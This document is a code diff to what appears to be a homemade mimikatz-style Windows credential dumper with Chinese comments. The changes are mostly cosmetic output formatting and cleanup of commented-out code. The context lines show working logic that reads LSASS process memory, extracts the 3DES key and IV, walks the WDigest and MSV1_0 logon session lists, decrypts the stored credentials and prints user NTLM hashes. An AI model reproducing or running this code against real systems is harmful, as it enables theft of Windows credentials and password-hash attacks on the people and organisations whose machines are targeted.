@@ -196,8 +196,9 @@ VOID LocateUnprotectLsassMemoryKeys() {
 	// KIWI_BCRYPT_KEY81 中 hardkey.data包含密钥字节内容， hardkey.cbSecret包含密钥的长度
 	memcpy(g_sekurlsa_3DESKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
 
-	wprintf(L"3Des Key Located (len %d): \n", extracted3DesKey.hardkey.cbSecret);
+	wprintf(L"3Des Key Located (len %d): ", extracted3DesKey.hardkey.cbSecret);
 	HexdumpBytesPacked(extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);
+	wprintf(L"\n");
 
 
 	/// 从lsass进程的内存中读取出IV(InitializationVector): g_sekurlsa_IV
@@ -229,6 +230,7 @@ VOID LocateUnprotectLsassMemoryKeys() {
 	ReadFromLsass(ivAddress, g_sekurlsa_IV, sizeof(g_sekurlsa_IV));
 	wprintf(L"IV Located: ");
 	HexdumpBytesPacked(g_sekurlsa_IV, sizeof(g_sekurlsa_IV));
+	wprintf(L"\n");
 }
 
 
@@ -264,14 +266,14 @@ VOID GetCredentialsFromWdigest() {
 
 	// 计算logSessListAddr全局变量地址
 	ReadFromLsass(wdigestBaseAddress + logSessListSigOffset + sizeof keySig + 4 + logSessListOffset, &logSessListAddr, sizeof logSessListAddr);
-	wprintf(L"logSessListAddr = 0x%p\n", logSessListAddr);
+	wprintf(L"logSessListAddr = 0x%p\n\n", logSessListAddr);
 
 	// 读取logSessListAddr指向的结构体内容
 	ReadFromLsass(logSessListAddr, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));
 	pList = entry.This;
 
 	wprintf(L"offset of UserName: 0x%x\n", offsetof(KIWI_WDIGEST_LIST_ENTRY, UserName));
-	wprintf(L"offset of Password: 0x%x\n", offsetof(KIWI_WDIGEST_LIST_ENTRY, Password));
+	wprintf(L"offset of Password: 0x%x\n\n", offsetof(KIWI_WDIGEST_LIST_ENTRY, Password));
 
 	do {
 		memset(&entry, 0, sizeof(entry));
@@ -342,23 +344,19 @@ VOID GetCredentialsFromMSV() {
 	if (keySigOffset == 0) return;
 	wprintf(L"keySigOffset = 0x%x\n", keySigOffset);
 
-	// 读取LogonSessionList的RVA
+	// 读取LogonSessionList的偏移量（相对相对于模块基址）
 	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof(keySig), &LogonSessionListOffset, sizeof(LogonSessionListOffset));
 	wprintf(L"LogonSessionListOffset = 0x%x\n", LogonSessionListOffset);
 
 	// 计算全局变量LogonSessionList的地址
 	logSessListAddr = (PKIWI_MSV1_0_LIST_63)(lsasrvBaseAddress + LogonSessionListOffset);
-	wprintf(L"logSessListAddr = 0x%p\n", logSessListAddr);
+	wprintf(L"logSessListAddr = 0x%p\n\n", logSessListAddr);
 
 	PKIWI_MSV1_0_LIST_63 pList = logSessListAddr;
 
 	do {
 		KIWI_MSV1_0_LIST_63 listEntry;
 		KIWI_MSV1_0_CREDENTIALS credentials;
-
-		// 最终输出：
-		// wprintf(L"Username: %ls\n", );
-		// wprintf(L"NTLMHash: %ls\n\n", );
 
 		memset(&listEntry, 0, sizeof(listEntry));
 		ReadFromLsass(pList, &listEntry, sizeof(KIWI_MSV1_0_LIST_63));
@@ -383,16 +381,8 @@ VOID GetCredentialsFromMSV() {
 				LSA_UNICODE_STRING* credStr = &primaryCred.Credentials;
 
 				if (credStr->Length && credStr->Buffer) {
-					WCHAR passDecrypted[1024];
 
-					LSA_UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(
-						(PUCHAR)pList + offsetof(KIWI_MSV1_0_LIST_63, UserName)
-						));
-
-					//if (username != NULL && username->Length != 0) wprintf(L"Username: %ls\n", username->Buffer);
-					//else wprintf(L"Username: [NULL]\n");
-
-					// 读取加密的凭据缓冲区
+					// 定义 MSV1_0_PRIMARY_CREDENTIAL_10_1607 结构体
 					typedef struct _MSV1_0_PRIMARY_CREDENTIAL_10_1607 {
 						LSA_UNICODE_STRING LogonDomainName;
 						LSA_UNICODE_STRING UserName;
@@ -417,45 +407,11 @@ VOID GetCredentialsFromMSV() {
 						/* buffer */
 					} MSV1_0_PRIMARY_CREDENTIAL_10_1607, * PMSV1_0_PRIMARY_CREDENTIAL_10_1607;
 
-					/*WCHAR encryptedCreds[1024] = { 0 };
-					ReadFromLsass(credStr->Buffer, encryptedCreds, credStr->Length);
-					WCHAR decryptedCreds[1024] = { 0 };
-					ULONG decryptedLength = DecryptCredentials((char*)encryptedCreds, credStr->Length, (PUCHAR)decryptedCreds, sizeof(decryptedCreds));
-					wprintf(L"Decrypted Credentials Length: %lu\n", decryptedLength);
-					PMSV1_0_PRIMARY_CREDENTIAL_10_1607 pUserBuf = (PMSV1_0_PRIMARY_CREDENTIAL_10_1607)encryptedCreds;*/
-
+					// 读取加密的凭据缓冲区
 					BYTE encryptedCreds[1024] = { 0 };
 					ReadFromLsass(credStr->Buffer, encryptedCreds, credStr->Length);
 					BYTE decryptedCreds[1024] = { 0 };
 					ULONG decryptedLength = DecryptCredentials((char*)encryptedCreds, credStr->Length, decryptedCreds, sizeof(decryptedCreds));
-					//wprintf(L"Decrypted Credentials Length: %lu\n", decryptedLength);
-					//PMSV1_0_PRIMARY_CREDENTIAL_10_1607 pUserBuf = (PMSV1_0_PRIMARY_CREDENTIAL_10_1607)decryptedCreds;
-
-					//LSA_UNICODE_STRING* UserName = ExtractUnicodeString((PUNICODE_STRING)(
-					//	(PUCHAR)pUserBuf + offsetof(MSV1_0_PRIMARY_CREDENTIAL_10_1607, UserName)
-					//	));
-					//if (UserName->Length != 0 && UserName->Buffer) {
-					//	wprintf(L"UserName->Length: %d\n", UserName->Length);
-					//	wprintf(L"Username: %ls\n", UserName->Buffer);
-					//}
-					//else {
-					//	wprintf(L"Username: [NULL]\n");
-					//}
-
-					//LSA_UNICODE_STRING* NtOwfPassword = ExtractUnicodeString((PUNICODE_STRING)(
-					//	(PUCHAR)pUserBuf + offsetof(MSV1_0_PRIMARY_CREDENTIAL_10_1607, NtOwfPassword)
-					//	));
-
-					//if (NtOwfPassword->Length != 0 && NtOwfPassword->Buffer) {
-					//	// Decrypt password using recovered AES/3Des keys and IV
-					//	if (DecryptCredentials((char*)NtOwfPassword->Buffer, NtOwfPassword->MaximumLength,
-					//		(PUCHAR)passDecrypted, sizeof(passDecrypted)) > 0) {
-					//		wprintf(L"Password: %ls\n\n", passDecrypted);
-					//	}
-					//}
-					//else {
-					//	wprintf(L"NTLMHash: [NULL]\n\n");
-					//}
 
 					PBYTE msvCredentials = decryptedCreds;
 
@@ -477,8 +433,7 @@ VOID GetCredentialsFromMSV() {
 					for (int i = 0; i < LM_NTLM_HASH_LENGTH; ++i) {
 						wprintf(L"%02x", pNtOwfPassword[i]);
 					}
-					wprintf(L"\n");
-
+					wprintf(L"\n\n");
 				}
 			}
 			credPtr = credentials.next;
